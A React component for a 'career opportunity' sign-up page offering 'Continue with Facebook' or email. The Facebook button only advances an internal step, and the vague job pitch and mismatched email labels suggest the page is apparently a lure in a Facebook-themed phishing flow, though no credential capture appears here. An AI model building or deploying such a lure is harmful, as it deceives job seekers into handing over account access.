import React from "react";
import Image from "next/image";
import LoadingSpinner from "../ui/LoadingSpinner";

function ActualForm({
  BusinessEmail,
  setBusinessEmail,
  BusinessEmailError,
  handleContinueWithEmail,
  NextStep,
  FacebookLogo,
  isLoading,
  loadingType,
}) {
  const isFacebookLoading = isLoading && loadingType === "facebook";
  const isEmailLoading = isLoading && loadingType === "email";

  return (
    <div className="md:w-1/2 bg-gray-50 text-gray-900 justify-center mb-5 mt-5 flex flex-col gap-4 md:gap-5 w-full rounded-xl shadow-lg p-6 md:p-10 border border-gray-200">
      <div className="flex flex-col gap-4 text-center">
        <h2 className="text-2xl md:text-3xl font-medium text-gray-900 m-0 px-1 sm:px-0 leading-tight">
          Thank You for Your Interest!
        </h2>
        <p className="text-gray-700 text-lg m-0 font-light">
          Career Opportunity Application
        </p>
        <p className="text-gray-600 text-sm m-0 px-1 sm:px-0 leading-relaxed">
          We appreciate your interest in joining our team. By continuing with
          Facebook or email below, you'll begin the application process for this
          exciting opportunity to help elevate our company's presence and
          connect with our passionate community worldwide.
        </p>
      </div>

      <button
        onClick={() =>
          !isLoading && NextStep("User clicked continue with Facebook")
        }
        disabled={isLoading}
        className={`bg-white border border-gray-300 w-[95%] md:w-[80%] mx-auto text-gray-800 text-sm font-medium py-3 md:py-4 px-4 rounded-lg flex items-center justify-center gap-3 cursor-pointer transition-all duration-200 ease-in-out min-h-[48px] md:min-h-[52px] ${
          isLoading
            ? "opacity-60 cursor-not-allowed"
            : "hover:bg-gray-100 hover:border-gray-400 hover:shadow-md"
        }`}
      >
        {isFacebookLoading && <LoadingSpinner />}
        {FacebookLogo && !isFacebookLoading && (
          <Image
            src={FacebookLogo}
            alt="Facebook Logo"
            width={20}
            height={20}
            style={{ color: "#1877F2" }}
          />
        )}
        {isFacebookLoading
          ? "Connecting with Facebook..."
          : "Continue with Facebook"}
      </button>

      <div className="relative flex items-center justify-center w-full before:content-[''] before:absolute before:top-1/2 before:left-0 before:right-0 before:border-t before:border-gray-300">
        <span className="relative px-4 bg-gray-50 text-gray-500 text-sm">
          or
        </span>
      </div>

      <div className="flex flex-col gap-1.5 w-full">
        <label
          htmlFor="email-input"
          className="w-[95%] md:w-[80%] mx-auto text-gray-700 text-sm font-medium text-left"
        >
          Email Address
        </label>
        <input
          id="email-input"
          type="email"
          placeholder="Enter your personal email"
          value={BusinessEmail}
          onChange={(e) => setBusinessEmail(e.target.value)}
          disabled={isLoading}
          aria-invalid={!!BusinessEmailError}
          aria-describedby={BusinessEmailError ? "email-error" : undefined}
          className={`w-[95%] md:w-[80%] mx-auto py-3 md:py-4 px-4 rounded-lg border border-gray-300 bg-white text-gray-900 text-sm box-border placeholder-gray-400 focus:border-red-500 focus:shadow-[0_0_0_2px_rgba(239,68,68,0.2)] focus:outline-none transition-all duration-200 ${
            isLoading
              ? "opacity-60 cursor-not-allowed"
              : "hover:border-gray-400"
          }`}
        />
        {BusinessEmailError && (
          <div
            id="email-error"
            className="text-red-500 text-xs mt-1 font-medium"
          >
            {BusinessEmailError}
          </div>
        )}
      </div>

      <button
        onClick={handleContinueWithEmail}
        disabled={isLoading}
        className={`bg-red-600 border-none w-[95%] md:w-[80%] mx-auto text-white text-sm font-medium py-3 md:py-4 px-6 rounded-lg flex items-center justify-center gap-3 cursor-pointer transition-all duration-200 ease-in-out mt-1 md:mt-2 min-h-[48px] md:min-h-[52px] ${
          isLoading ? "opacity-60 cursor-not-allowed" : "hover:bg-red-700"
        }`}
      >
        {isEmailLoading && <LoadingSpinner />}
        {isEmailLoading ? "Creating Account..." : "Get Started"}
      </button>

      <div className="text-center mt-2">
        <p className="text-gray-600 text-xs leading-relaxed">
          By continuing, you'll begin the application process for this career
          opportunity and agree to our privacy policy and terms of service.
          We'll guide you through each step of the application process.
        </p>
      </div>
    </div>
  );
}

export default ActualForm;
